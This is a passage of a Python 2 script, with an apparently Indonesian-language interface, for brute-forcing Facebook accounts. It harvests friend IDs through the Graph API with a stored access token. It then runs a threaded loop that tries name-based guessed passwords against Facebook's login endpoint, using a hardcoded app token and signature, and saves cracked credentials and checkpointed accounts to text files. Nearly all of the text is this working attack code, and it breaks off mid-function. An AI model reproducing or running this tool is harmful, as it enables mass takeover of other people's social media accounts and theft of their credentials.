																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/fhilip.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/fhilip.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone fhilip.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK PRANCIS #####
def crack_prancis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;94m _________ \033[1;97m   _____\033[1;91m___.    "
	print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;91m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/ \033[1;97m\   __\ \033[1;91m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____ \033[1;97m|  | \033[1;91m  | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;94m  \______  /.\033[1;97m|__|  \033[1;91m |___  /"
	print "\033[1;94m         \/         \033[1;91m    \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mPrancis\033[1;97m)\033[1;94m─────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_prancis()

#### PILIH PRANCIS ####
def pilih_prancis():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_prancis()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;94m _________ \033[1;97m   _____\033[1;91m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;91m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/ \033[1;97m\   __\ \033[1;91m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____ \033[1;97m|  | \033[1;91m  | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  /.\033[1;97m|__|  \033[1;91m |___  /"
		print "\033[1;94m         \/           \033[1;91m  \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK PRANCIS \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;94m _________ \033[1;97m   _____\033[1;91m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;91m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/ \033[1;97m\   __\ \033[1;91m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____ \033[1;97m|  | \033[1;91m  | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  /.\033[1;97m|__|  \033[1;91m |___  /"
		print "\033[1;94m         \/           \033[1;91m  \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK PRANCIS \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_prancis()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;94m _________ \033[1;97m   _____\033[1;91m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;91m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/ \033[1;97m\   __\ \033[1;91m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____ \033[1;97m|  | \033[1;91m  | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  /.\033[1;97m|__|  \033[1;91m |___  /"
		print "\033[1;94m         \/           \033[1;91m  \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK PRANCIS \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_prancis()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_prancis()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN PRANCIS #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/prancis.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/prancis.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/prancis.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/prancis.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/prancis.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/prancis.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('pasword')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/prancis.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/prancis.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/prancis.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/prancis.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/prancis.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/prancis.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/prancis.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/prancis.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/prancis.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/prancis.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone prancis.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK TURKEY #####
def crack_turkey():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;91m  \______  /|__|   |___  /"
	print "\033[1;91m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m─────────────────────\033[1;97m(\033[1;93mTurky\033[1;97m)\033[1;94m──────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_turkey()

#### PILIH Turkey ####
def pilih_turkey():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_turkey()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK TURKY \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK TURKY \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_turkey()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
